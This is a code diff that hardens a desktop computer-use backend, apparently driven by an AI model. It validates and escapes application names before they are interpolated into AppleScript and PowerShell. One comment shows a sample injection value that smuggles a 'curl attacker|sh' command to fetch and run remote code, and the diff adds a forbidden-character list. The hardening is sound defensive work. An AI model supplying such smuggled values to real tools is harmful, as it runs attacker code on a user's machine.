@@ -37,6 +37,33 @@ logger = logging.getLogger(__name__)
 
 _PYAUTOGUI_AVAILABLE: Optional[bool] = None
 
+#: Characters that can terminate or extend a command inside the interpreted
+#: scripting languages this backend shells out to. Both AppleScript and
+#: PowerShell treat a bare quote or newline as a statement boundary, so a
+#: value carrying one escapes the intended command entirely — e.g.
+#: ``app = 'Finder" to activate\ndo shell script "curl attacker|sh'``.
+_APP_NAME_FORBIDDEN = ('"', "'", "\n", "\r", "`", ";", "&", "|", "$", "(", ")", "<", ">")
+
+
+def _validate_app_name(app: str) -> str:
+    """Return a reason string if *app* is unsafe to embed in a script, else "".
+
+    Application names are short, human-facing labels ("Safari", "Google
+    Chrome", "Microsoft Teams"). They never need quotes, shell operators or
+    newlines, so anything containing one is either a mistake or an attempt to
+    escape the intended command.
+    """
+    if not app or not app.strip():
+        return "app name is empty"
+    if len(app) > 128:
+        return "app name is implausibly long"
+    for ch in _APP_NAME_FORBIDDEN:
+        if ch in app:
+            return f"app name contains a forbidden character ({ch!r})"
+    if app.strip() != app:
+        return "app name has leading or trailing whitespace"
+    return ""
+
 
 def _probe_xvfb() -> bool:
     if sys.platform != "linux":
@@ -545,6 +572,18 @@ class PyAutoGUIBackend(ComputerUseBackend):
             return _list_apps_linux()
 
     def focus_app(self, app: str, raise_window: bool = False) -> ActionResult:
+        # ``app`` is model-controlled and is interpolated into *script source*
+        # below, so it must be validated. Passing a list to subprocess only
+        # avoids shell metacharacters; AppleScript and PowerShell are both
+        # interpreted languages, and a stray quote or newline escapes the
+        # intended command. This path also never goes through the exec tool,
+        # so DANGEROUS_COMMAND_PATTERNS cannot see it.
+        if err := _validate_app_name(app):
+            return ActionResult(
+                ok=False, action="focus_app",
+                message=f"Refused to focus app: {err}",
+            )
+
         try:
             if sys.platform == "darwin":
                 subprocess.run(
@@ -554,9 +593,12 @@ class PyAutoGUIBackend(ComputerUseBackend):
                 return ActionResult(ok=True, action="focus_app", message=f"Focused app: {app}")
 
             elif sys.platform == "win32":
+                # Quote for PowerShell by doubling the single quote, the
+                # escape PowerShell itself uses inside a single-quoted string.
+                safe_app = app.replace("'", "''")
                 subprocess.run(
                     ["powershell", "-Command",
-                     f"(New-Object -ComObject WScript.Shell).AppActivate('{app}')"],
+                     f"(New-Object -ComObject WScript.Shell).AppActivate('{safe_app}')"],
                     capture_output=True, text=True, timeout=5,
                 )
                 return ActionResult(ok=True, action="focus_app", message=f"Focused app: {app}")
